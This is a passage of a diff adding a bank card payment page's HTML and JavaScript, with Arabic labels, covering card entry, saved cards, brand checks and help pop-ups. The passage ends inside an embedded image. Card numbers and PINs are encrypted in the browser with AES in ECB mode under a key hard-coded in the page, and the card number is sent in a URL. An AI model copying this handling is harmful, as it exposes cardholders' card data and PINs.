+                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                //Added for Points Redemption - modified
+                $("#overlayhide1").hide();
+                $('#proceedConfirm').show();
+                //document.getElementById('otpmsgDC2').innerHTML = '&#1610;&#1585;&#1580;&#1609; &#1573;&#1583;&#1582;&#1575;&#1604; &#1575;&#1604;&#1585;&#1605;&#1586; &#1575;&#1604;&#1605;&#1603;&#1608;&#1606; &#1605;&#1606; ';   
+                document.getElementById('otpmsgDC2').innerHTML = '&#1610;&#1585;&#1580;&#1609; &#1573;&#1583;&#1582;&#1575;&#1604; &#1575;&#1604;&#1585;&#1605;&#1586; &#1575;&#1604;&#1605;&#1603;&#1608;&#1606; &#1605;&#1606; ' + document.paypage.debitOTP.maxLength + ' ' + '&#1571;&#1585;&#1602;&#1575;&#1605; &#1575;&#1604;&#1605;&#1585;&#1587;&#1604; &#1573;&#1604;&#1609; &#1575;&#1604;&#1580;&#1608;&#1575;&#1604;';
+            }
+        }
+    }
+
+    function onProceed_buttonClicked() {
+        $('#proceedConfirm').hide();
+        $("#overlayhide1").show();
+
+        //Added for Points Redemption 
+        /* if(document.paypage.creditDebitCheck.value=="" )
+           {
+              document.paypage.creditDebitCheck.value="D";
+           }  */
+
+        if (document.paypage.creditDebitCheck.value == "" && true) {
+            document.paypage.creditDebitCheck.value = "D";
+        } else if (document.paypage.creditDebitCheck.value == "" && false) {
+
+            document.paypage.creditDebitCheck.value = "C";
+
+        }
+        //Added for Points Redemption
+
+        //Added for prod issue - 29-jun-21
+        document.paypage.paymentStatus.value = 1;
+        //Added for prod issue - 29-jun-21
+
+        var creditDebitCheckVal = document.paypage.creditDebitCheck.value;
+
+        if (creditDebitCheckVal == "D") {
+            if (true) {
+                var debitMonth = $("#debitMonthSelect").val();
+                var debitYear = $("#debitYearSelect").val();
+                $('#debitMonthSelect').remove();
+                $('#debitYearSelect').remove();
+            } else {
+                var debitMonth = $("#debitMonth").val();
+                var debitYear = $("#debitYear").val();
+            }
+            var debitCardNumber = $("#debitCardNumber").val();
+            var cardPin = $("#cardPin").val();
+
+            var encryptedDbCdNumber = "";
+            var encryptedDebitMonth = "";
+            var encryptedDebitYear = "";
+            var encryptedCardPin = "";
+            var paymentId = "60102700006594106019560000720410";
+            var mode = 'ECB';
+            encryptedDbCdNumber = byteArrayToHex(rijndaelEncrypt(debitCardNumber, hexToByteArray(paymentId), mode));
+            if (cardPin != undefined) {
+                encryptedCardPin = byteArrayToHex(rijndaelEncrypt(cardPin, hexToByteArray(paymentId), mode));
+            }
+            encryptedDebitMonth = byteArrayToHex(rijndaelEncrypt(debitMonth, hexToByteArray(paymentId), mode));
+            encryptedDebitYear = byteArrayToHex(rijndaelEncrypt(debitYear, hexToByteArray(paymentId), mode));
+
+
+            callDebitSave(document.paypage, encryptedDbCdNumber, encryptedDebitMonth, encryptedDebitYear, encryptedCardPin);
+
+        } else if (creditDebitCheckVal == "SVC") {
+
+            var encryptedCrCdNumber = "";
+            var encryptedSavedCardCardPin = "";
+
+
+            var cardCvv = "";
+            var cardPin = "";
+            var cardNumber = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[0];
+            var cardType = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[1];
+            var useinst = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[2];
+            var authenticationtype = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[3];
+            var savedbrandtype = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[4];
+
+            if (savedbrandtype != null && savedbrandtype == 'MA') {
+                cardCvv = '';
+                cardPin = '';
+            } else {
+
+                if (cardType == 'D') {
+
+                    cardCvv = $("#debitsavedcardCVV").val();
+                    cardPin = $("#debitsavedcardPIN").val();
+
+                }
+
+            }
+
+            var paymentId = "60102700006594106019560000720410";
+            var mode = 'ECB';
+            encryptedCrCdNumber = byteArrayToHex(rijndaelEncrypt(cardNumber, hexToByteArray(paymentId), mode));
+
+
+            if (cardPin != undefined && cardPin != '') {
+                encryptedSavedCardCardPin = byteArrayToHex(rijndaelEncrypt(cardPin, hexToByteArray(paymentId), mode));
+            }
+
+            document.paypage.usingFc.value = "on";
+            callSavedCardSave(document.paypage, encryptedCrCdNumber, encryptedSavedCardCardPin);
+
+        }
+
+        //Added for Points Redemption
+        else if (creditDebitCheckVal == "C") {
+            if (true) {
+                var debitMonth = $("#debitMonthSelect").val();
+                var debitYear = $("#debitYearSelect").val();
+                $('#debitMonthSelect').remove();
+                $('#debitYearSelect').remove();
+            } else {
+                var debitMonth = $("#debitMonth").val();
+                var debitYear = $("#debitYear").val();
+            }
+            var debitCardNumber = $("#debitCardNumber").val();
+
+            var encryptedDbCdNumber = "";
+            var encryptedDebitMonth = "";
+            var encryptedDebitYear = "";
+
+            var paymentId = "60102700006594106019560000720410";
+            var mode = 'ECB';
+            encryptedDbCdNumber = byteArrayToHex(rijndaelEncrypt(debitCardNumber, hexToByteArray(paymentId), mode));
+
+            encryptedDebitMonth = byteArrayToHex(rijndaelEncrypt(debitMonth, hexToByteArray(paymentId), mode));
+            encryptedDebitYear = byteArrayToHex(rijndaelEncrypt(debitYear, hexToByteArray(paymentId), mode));
+
+
+            callCreditSave(document.paypage, encryptedDbCdNumber, encryptedDebitMonth, encryptedDebitYear);
+
+        }
+        //Added for Points Redemption
+
+
+    }
+
+    function onReset_buttonClicked() {
+        var checkFC;
+        var checkDC;
+        if (document.getElementById("savedCardDiv").style.display == 'block') {
+            checkFC = document.getElementById("paymentOptionFC").checked;
+        }
+        if (document.getElementById("FCUseDebitEnable").style.display == 'block') {
+            checkDC = document.getElementById("paymentOptionDC").checked;
+        }
+
+        document.getElementById("paypage").reset();
+
+        if (checkFC) {
+            document.getElementById("paymentOptionFC").checked = true;
+        }
+        if (checkDC) {
+            document.getElementById("paymentOptionDC").checked = true;
+        }
+        document.getElementById('dcprefix').innerHTML = '<select  class="paymentselect"><option value="bankcode" id="bankcode">&#1576;&#1575;&#1583;&#1616;&#1574;&#1577;</option></select>';
+        //Added for cosmetic changes
+        if (document.getElementById("ValidationMessage")) {
+            $("#ValidationMessage").hide();
+        }
+        if (document.getElementById("CVmsg")) {
+            $("#CVmsg").hide();
+        }
+        if (document.getElementById("otpmsgDC")) {
+            $("#otpmsgDC").hide();
+        }
+        if (document.getElementById("otpmsgDC2")) {
+            $("#otpmsgDC2").hide();
+        }
+        //Added for cosmetic changes
+    }
+    /**Added for One Click Checkout**/
+    //SavedCard
+
+
+    function callSavedCardSave(formObject, encryptedCrCdNumber, encryptedCreditCardPin) {
+
+        document.paypage.proceed.disabled = true;
+        //document.paypage.cancel.disabled = true;
+
+        if (document.getElementById("debitNumber")) {
+            document.getElementById("debitNumber").value = "";
+        }
+
+        if (document.getElementById("dcprefix")) {
+            document.getElementById("dcprefix").value = "";
+        }
+
+        if (document.getElementById("debitsavedcardPIN")) {
+            document.getElementById("debitsavedcardPIN").value = "";
+        }
+
+        document.paypage.encryptedCardNumber.value = encryptedCrCdNumber;
+        document.paypage.encryptedSavedCardPin.value = encryptedCreditCardPin;
+        document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+        document.paypage.action = "/kpg/paymentrouter.htm";
+        document.paypage.submit();
+
+
+    }
+    /**Added for One Click Checkout**/
+
+
+    //Debit
+    function callDebitSave(formObject, encryptedDbCdNumber, encryptedDebitMonth, encryptedDebitYear, encryptedCardPin) {
+
+
+        document.paypage.confirm.disabled = true;
+        //document.paypage.cancel.disabled = true;
+        //document.paypage.reset.disabled = true;
+
+        /* var fcListDebitCnt = 0;
+            
+            
+        if(fcListDebitCnt == 0) {
+            
+        document.paypage.debitCardNumber.value="****************";
+         document.paypage.encryptedCardNumber.value=encryptedDbCdNumber;
+            document.paypage.fcExpCheck.value = "";
+        } */
+
+        document.paypage.debitCardNumber.value = "****************";
+        document.paypage.encryptedCardNumber.value = encryptedDbCdNumber;
+
+        if (document.getElementById("debitNumber")) {
+            document.getElementById("debitNumber").value = "";
+        }
+
+        if (document.getElementById("dcprefix")) {
+            document.getElementById("dcprefix").value = "";
+        }
+
+        if (document.getElementById("debitsavedcardPIN")) {
+            document.getElementById("debitsavedcardPIN").value = "";
+        }
+
+        if (false) {
+            document.paypage.debitMonth.value = "**";
+            document.paypage.debitYear.value = "****";
+        }
+        document.paypage.encryptedMonth.value = encryptedDebitMonth;
+
+
+        document.paypage.encryptedYear.value = encryptedDebitYear;
+
+        if (encryptedCardPin != '') {
+            document.paypage.cardPin.value = encryptedCardPin;
+        }
+
+
+        document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+        document.paypage.action = "/kpg/paymentrouter.htm";
+        document.paypage.submit();
+
+
+    }
+
+    //Added for Points Redemption 
+    function callCreditSave(formObject, encryptedDbCdNumber, encryptedDebitMonth, encryptedDebitYear) {
+
+
+        document.paypage.confirm.disabled = true;
+        /* document.paypage.cancel.disabled = true;
+        document.paypage.reset.disabled = true; */
+
+
+        document.paypage.debitCardNumber.value = "****************";
+        document.paypage.encryptedCardNumber.value = encryptedDbCdNumber;
+
+        if (document.getElementById("debitNumber")) {
+            document.getElementById("debitNumber").value = "";
+        }
+
+        if (document.getElementById("dcprefix")) {
+            document.getElementById("dcprefix").value = "";
+        }
+
+        if (document.getElementById("debitsavedcardPIN")) {
+            document.getElementById("debitsavedcardPIN").value = "";
+        }
+
+        if (false) {
+            document.paypage.debitMonth.value = "**";
+            document.paypage.debitYear.value = "****";
+        }
+        document.paypage.encryptedMonth.value = encryptedDebitMonth;
+
+
+        document.paypage.encryptedYear.value = encryptedDebitYear;
+
+        document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+        document.paypage.action = "/kpg/paymentrouter.htm";
+        document.paypage.submit();
+
+    }
+    //Added for Points Redemption
+    </script>
+  
+    <script type="text/javascript">
+
+
+    function performMaestroRupayCheck(cardNo) {
+        if (false) {
+            document.paypage.selectedPymntInstrmnt.value = document.paypage.creditDebitCheck.value;
+        }
+
+        if (cardNo == "")
+            return false;
+
+        /* if (cardNoTemp == cardNo)
+            return false; */
+        var payID = document.paypage.paymentId.value;
+        //  cardNoTemp = cardNo; 
+
+        var url = "/kpg/checkMaestroBrand.htm?paymentId=" + payID + "&termId=" + 106301 + "&instId=" + 209 + "&merchId=" + 1063 + "&cardNo=" + cardNo;
+        var req = initRequest();
+        req.open("POST", url, false);
+        req.send(null);
+        if (req.status == 200) {
+            var onOffFlg = 0;
+            var msg = req.responseXML.getElementsByTagName("msg")[0];
+            if (msg != null) {
+                if ("undefined" != msg.getElementsByTagName("brandType")) {
+                    var BrandType = msg.getElementsByTagName("brandType")[0].childNodes[0].nodeValue;
+                    document.paypage.checkBrand.value = BrandType;
+                    if ("undefined" != msg.getElementsByTagName("onOffFlg")) {
+                        onOffFlg = msg.getElementsByTagName("onOffFlg")[0].childNodes[0].nodeValue;
+                        document.paypage.onOffType.value = onOffFlg;
+                    }
+                    if (BrandType == "MA") {
+                        if (document.paypage.selectedPymntInstrmnt.value == 'C') {
+                            if (document.getElementById("cardCVVHideShow"))
+                                document.getElementById("cardCVVHideShow").style.display = 'none';
+                            if (document.getElementById("cardCVVHideShow1"))
+                                document.getElementById("cardCVVHideShow1").style.display = 'none';
+                            if (document.getElementById("cardCVVD2HideShow"))
+                                document.getElementById("cardCVVD2HideShow").style.display = 'none';
+                            alert("You have entered a Maestro Card. So the transaction will be processed without CVV..\n If your Maestro card does not have expiry date then request you to select Month as 12 and Year as 2049");
+                            document.getElementById("maestro").value = "MA";
+                        } else if (document.paypage.selectedPymntInstrmnt.value == 'OC') {
+                            if (document.getElementById("otherCardCVVHideShow"))
+                                document.getElementById("otherCardCVVHideShow").style.display = 'none';
+                            if (document.getElementById("otherCardCVVHideShow1"))
+                                document.getElementById("otherCardCVVHideShow1").style.display = 'none';
+                            if (document.getElementById("otherCreditcardCVVD2HideShow"))
+                                document.getElementById("otherCreditcardCVVD2HideShow").style.display = 'none';
+                            alert("You have entered a Maestro Card. So the transaction will be processed without CVV..\n If your Maestro card does not have expiry date then request you to select Month as 12 and Year as 2049");
+                            document.getElementById("maestro").value = "MA";
+                        } else if (document.paypage.selectedPymntInstrmnt.value == 'D') {
+                            if (document.getElementById("debitCardCVVHideShow"))
+                                document.getElementById("debitCardCVVHideShow").style.display = 'none';
+                            if (document.getElementById("cardCVD2HideShowPIN"))
+                                document.getElementById("cardCVD2HideShowPIN").style.display = 'none';
+                            alert("You have entered a Maestro Card. So the transaction will be processed without CVV..\n If your Maestro card does not have expiry date then request you to select Month as 12 and Year as 2049");
+                            document.getElementById("maestro").value = "MA";
+                        } else if (document.paypage.selectedPymntInstrmnt.value == 'OD') {
+                            if (document.getElementById("otherDebitCardCVVHideShow"))
+                                document.getElementById("otherDebitCardCVVHideShow").style.display = 'none';
+                            if (document.getElementById("otherDebitCardCVD2HideShowPIN"))
+                                document.getElementById("otherDebitCardCVD2HideShowPIN").style.display = 'none';
+                            alert("You have entered a Maestro Card. So the transaction will be processed without CVV..\n If your Maestro card does not have expiry date then request you to select Month as 12 and Year as 2049");
+                            document.getElementById("maestro").value = "MA";
+                        }
+
+
+                        document.getElementById("rdc").value = "";
+
+                    } else if (BrandType == "RDC" && false) {
+
+                        //document.paypage.fcFlag.value=0;
+                        document.paypage.siFlag.value = 0;
+
+                        $("#siflg").hide();
+                        /* $("#checkprepaidFC").hide();
+                        $("#checkFC").hide();
+                        $("#checkDebitFC").hide();
+                        $("#fcDetails").hide(); */
+                        if (document.paypage.selectedPymntInstrmnt.value == 'D') {
+                            if (document.paypage.debitSel.value == 'VP' || document.paypage.debitSel.value == 'V') {
+                                if (document.getElementById("cardCVD2HideShowPIN"))
+                                    document.getElementById("cardCVD2HideShowPIN").style.display = 'block';
+                                if (document.getElementById("debitCardCVVHideShow"))
+                                    document.getElementById("debitCardCVVHideShow").style.display = 'none';
+                                if (document.getElementById("savedCardCVVHideShow"))
+                                    document.getElementById("savedCardCVVHideShow").style.display = 'none';
+                            }
+                            document.getElementById("rdc").value = "DRDC";
+                        } else if (document.paypage.selectedPymntInstrmnt.value == 'C') {
+                            if (document.paypage.creditSel.value == 'VP' || document.paypage.creditSel.value == 'V') {
+                                if (document.getElementById("cardCVVD2HideShow"))
+                                    document.getElementById("cardCVVD2HideShow").style.display = 'block';
+                                if (document.getElementById("cardCVVHideShow1"))
+                                    document.getElementById("cardCVVHideShow1").style.display = 'none';
+                                if (document.getElementById("cardCVVHideShow"))
+                                    document.getElementById("cardCVVHideShow").style.display = 'none';
+                                if (document.getElementById("savedcardCVVD2HideShow"))
+                                    document.getElementById("savedcardCVVD2HideShow").style.display = 'none';
+                            }
+                            document.getElementById("rdc").value = "CRDC";
+                        } else if (document.paypage.selectedPymntInstrmnt.value == 'OC') {
+                            if (document.paypage.creditSel.value == 'VP' || document.paypage.creditSel.value == 'V') {
+                                if (document.getElementById("otherCreditcardCVVD2HideShow"))
+                                    document.getElementById("otherCreditcardCVVD2HideShow").style.display = 'block';
+                                if (document.getElementById("savedcardCVVD2HideShow"))
+                                    document.getElementById("savedcardCVVD2HideShow").style.display = 'block';
+                                if (document.getElementById("otherCardCVVHideShow1"))
+                                    document.getElementById("otherCardCVVHideShow1").style.display = 'none';
+                                if (document.getElementById("otherCardCVVHideShow"))
+                                    document.getElementById("otherCardCVVHideShow").style.display = 'none';
+                                if (document.getElementById("savedCardCVVHideShow"))
+                                    document.getElementById("savedCardCVVHideShow").style.display = 'none';
+                            }
+                            document.getElementById("rdc").value = "OCRDC";
+                        } else if (document.paypage.selectedPymntInstrmnt.value == 'OD') {
+                            //if(document.paypage.debitSel.value=='VP' || document.paypage.debitSel.value=='V') {   
+                            if (document.getElementById("otherDebitCardCVD2HideShowPIN"))
+                                document.getElementById("otherDebitCardCVD2HideShowPIN").style.display = 'block';
+                            if (document.getElementById("otherDebitCardCVVHideShow"))
+                                document.getElementById("otherDebitCardCVVHideShow").style.display = 'none';
+                            if (document.getElementById("savedCardCVD2HideShowPIN"))
+                                document.getElementById("savedCardCVD2HideShowPIN").style.display = 'none';
+                            if (document.getElementById("savedCardCVVHideShow"))
+                                document.getElementById("savedCardCVVHideShow").style.display = 'block';
+                            //}
+                            document.getElementById("rdc").value = "ODRDC";
+                        } else if (document.paypage.selectedPymntInstrmnt.value == 'SVC') {
+                            if (document.paypage.debitSel.value == 'VP' || document.paypage.debitSel.value == 'V') {
+                                if (document.getElementById("savedcardCVD2HideShowPIN"))
+                                    document.getElementById("savedcardCVD2HideShowPIN").style.display = 'block';
+                                if (document.getElementById("savedCardCVVHideShow"))
+                                    document.getElementById("savedCardCVVHideShow").style.display = 'none';
+                            }
+                            document.getElementById("rdc").value = "DRDC";
+                        }
+
+
+                        //  document.getElementById("rdc").value = "RDC";
+                        document.getElementById("maestro").value = "";
+
+                    } else {
+                        document.getElementById("rdc").value = "";
+                        document.getElementById("maestro").value = "";
+
+                        if (document.paypage.selectedPymntInstrmnt.value == 'C') {
+                            if (document.paypage.creditSel.value == 'VP' || document.paypage.creditSel.value == 'V') {
+                                if (document.getElementById("cardCVVHideShow"))
+                                    document.getElementById("cardCVVHideShow").style.display = 'block';
+                                if (document.getElementById("cardCVVHideShow1"))
+                                    document.getElementById("cardCVVHideShow1").style.display = 'block';
+                                if (document.getElementById("cardCVVD2HideShow"))
+                                    document.getElementById("cardCVVD2HideShow").style.display = 'none';
+                                if (document.getElementById("savedcardCVVHideShow"))
+                                    document.getElementById("savedcardCVVHideShow").style.display = 'block';
+                            }
+                        } else if (document.paypage.selectedPymntInstrmnt.value == 'D') {
+                            if (document.paypage.debitSel.value == 'VP' || document.paypage.debitSel.value == 'V') {
+                                if (document.getElementById("cardCVD2HideShowPIN"))
+                                    document.getElementById("cardCVD2HideShowPIN").style.display = 'none';
+                                if (document.getElementById("debitCardCVVHideShow"))
+                                    document.getElementById("debitCardCVVHideShow").style.display = 'block';
+                                if (document.getElementById("savedcardCVD2HideShowPIN"))
+                                    document.getElementById("savedcardCVD2HideShowPIN").style.display = 'none';
+                                if (document.getElementById("savedCardCVVHideShow"))
+                                    document.getElementById("savedCardCVVHideShow").style.display = 'block';
+                            }
+                        } else if (document.paypage.selectedPymntInstrmnt.value == 'OC') {
+                            if (document.paypage.creditSel.value == 'VP' || document.paypage.creditSel.value == 'V') {
+                                if (document.getElementById("otherCreditcardCVVD2HideShow"))
+                                    document.getElementById("otherCreditcardCVVD2HideShow").style.display = 'none';
+                                if (document.getElementById("otherCardCVVHideShow1"))
+                                    document.getElementById("otherCardCVVHideShow1").style.display = 'block';
+                                if (document.getElementById("otherCardCVVHideShow"))
+                                    document.getElementById("otherCardCVVHideShow").style.display = 'block';
+                                if (document.getElementById("savedcardCVVD2HideShow"))
+                                    document.getElementById("savedcardCVVD2HideShow").style.display = 'none';
+                            }
+                        } else if (document.paypage.selectedPymntInstrmnt.value == 'OD') {
+                            if (document.paypage.debitSel.value == 'VP' || document.paypage.debitSel.value == 'V') {
+                                if (document.getElementById("otherDebitCardCVD2HideShowPIN"))
+                                    document.getElementById("otherDebitCardCVD2HideShowPIN").style.display = 'none';
+                                if (document.getElementById("savedCardCVD2HideShowPIN"))
+                                    document.getElementById("savedCardCVD2HideShowPIN").style.display = 'none';
+                                if (document.getElementById("otherDebitCardCVVHideShow"))
+                                    document.getElementById("otherDebitCardCVVHideShow").style.display = 'block';
+                                if (document.getElementById("savedCardCVVHideShow"))
+                                    document.getElementById("savedCardCVVHideShow").style.display = 'block';
+                            }
+                        }
+                    }
+
+                }
+            }
+
+        }
+    }
+
+
+
+
+
+
+
+    function onback_Click() {
+        var payid = document.paypage.paymentId.value;
+        //Added for prod issue - 29-jun-21
+        //document.paypage.pymntpagebkstatus.value=1;
+
+        if (document.getElementById("debitNumber")) {
+            document.getElementById("debitNumber").value = "";
+        }
+
+        if (document.getElementById("dcprefix")) {
+            document.getElementById("dcprefix").value = "";
+        }
+
+        if (document.getElementById("cardPin")) {
+            document.getElementById("cardPin").value = "";
+        }
+
+        if (document.getElementById("debitsavedcardPIN")) {
+            document.getElementById("debitsavedcardPIN").value = "";
+        }
+        if (document.getElementById("debitCardNumber")) {
+            document.getElementById("debitCardNumber").value = "";
+        }
+        document.paypage.debitMonth.value = 0;
+        document.paypage.debitYear.value = 0;
+        document.paypage.action = "/kpg/paymentpage.htm?PaymentID=" + payid;
+        document.paypage.submit();
+
+    }
+
+
+
+    function onclckCancel() {
+        if (false) {
+            document.paypage.fCFlg.value = document.paypage.fCFlg.value;
+        }
+        document.paypage.action = "/kpg/paymentcancel.htm?paymentid=" + document.paypage.paymentId.value;
+        document.paypage.submit();
+    }
+    </script>
+    <script type="text/javascript">
+    function cancelPage() {
+
+    }
+
+    function cptchaMsg() {
+        alert('By entering the code you see in the box, you help prevent automated transactions. This reduces system loads and ensures better performance of our services. If no image appears, please make sure your browser is set to display images and try again. If you are not sure what the code is, make your best guess. If you guess incorrectly, you will have another oppurtunity provided with a different code.');
+    }
+
+    function cvvMsg() {
+        alert('The Card Verification Value (CVV) is a 3-digit number found on the signature panel on the back of your card following the printed Card number.');
+    }
+
+    function expMsg() {
+        alert('Customers are requested to enter Valid From / Valid Thru / Expiry Date. These details would be available on the front panel of the card.');
+    }
+
+    function pinMsg() {
+        alert('Personal Identification Number (PIN) is the secret numeric password used to authenticate the user while performing any ATM, Point of sale and internet transactions. The Cardholder expresses authority to the Bank for carrying out transactions and instructions authenticated by the PIN. You will be required to enter your PIN only once for every transaction.');
+    }
+    </script>
+    <script type="text/javascript">
+    function openCapWin() {
+        window.open('help.htm?page=captcha', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=320')
+    }
+
+    function openCvvWin() {
+        window.open('help.htm?page=cvv', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=370')
+    }
+
+    function openPinWin() {
+        window.open('help.htm?page=pin', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=300')
+    }
+
+    function openExpiryDateWin() {
+        window.open('help.htm?page=expiryDate', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=250')
+    }
+
+    function openEcomPinWin() {
+        window.open('help.htm?page=ecomPin', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=400')
+    }
+
+    function openAtmEcomPinWin() {
+        window.open('help.htm?page=atmEcomPin', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=400')
+    }
+    </script>
+    <noscript>
+        <style>
+            #PayPageEntry{
+display: none;
+}
+#payConfirm{
+display: none;
+}
+</style>
+        <div class="content-block" style="width: 90%;">
+            <div class="form-card">
+                <img class="logoHead-mob" src='data:image/jpeg;base64,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